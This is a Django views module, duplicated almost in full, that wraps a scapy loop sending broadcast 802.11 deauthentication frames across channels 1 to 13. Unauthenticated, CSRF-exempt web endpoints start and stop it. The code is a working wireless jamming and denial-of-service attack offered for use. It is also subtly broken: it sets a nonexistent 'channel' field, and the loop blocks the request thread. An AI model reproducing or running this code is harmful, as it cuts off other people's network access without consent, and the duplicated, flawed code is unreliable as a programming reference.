from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import scapy.all as scapy

jamming = False

def home(request):
    return render(request, 'home.html')

def jam_wireless_networks(interface):
    global jamming
    channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]

    while jamming:
        try:
            for channel in channels:
                packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1="FF:FF:FF:FF:FF:FF",
                                                         addr2="12:34:56:78:90:AB", addr3="12:34:56:78:90:AB") / scapy.Dot11Deauth()
                packet[scapy.Dot11].channel = channel
                scapy.sendp(packet, iface=interface, verbose=False)
        except KeyboardInterrupt:
            break



@csrf_exempt
def start_jamming(request):
    global jamming
    if request.method == 'POST':
        interface = request.POST.get('interface')
        if not jamming:
            jamming = True
            jam_wireless_networks(interface)
            return JsonResponse({'status': 'Jamming started'})
        else:
            return JsonResponse({'status': 'Jamming already in progress'})
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)

@csrf_exempt
def stop_jamming(request):
    global jamming
    if request.method == 'POST':
        jamming = False
        return JsonResponse({'status': 'Jamming stopped'})
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)
from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import scapy.all as scapy

jamming = False

def jam_wireless_networks(interface):
    global jamming
    channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]

    while jamming:
        try:
            for channel in channels:
                packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1="FF:FF:FF:FF:FF:FF",
                                                         addr2="12:34:56:78:90:AB", addr3="12:34:56:78:90:AB") / scapy.Dot11Deauth()
                packet[scapy.Dot11].channel = channel
                scapy.sendp(packet, iface=interface, verbose=False)
        except KeyboardInterrupt:
            break



@csrf_exempt
def start_jamming(request):
    global jamming
    if request.method == 'POST':
        interface = request.POST.get('interface')
        if not jamming:
            jamming = True
            jam_wireless_networks(interface)
            return JsonResponse({'status': 'Jamming started'})
        else:
            return JsonResponse({'status': 'Jamming already in progress'})
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)

@csrf_exempt
def stop_jamming(request):
    global jamming
    if request.method == 'POST':
        jamming = False
        return JsonResponse({'status': 'Jamming stopped'})
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)
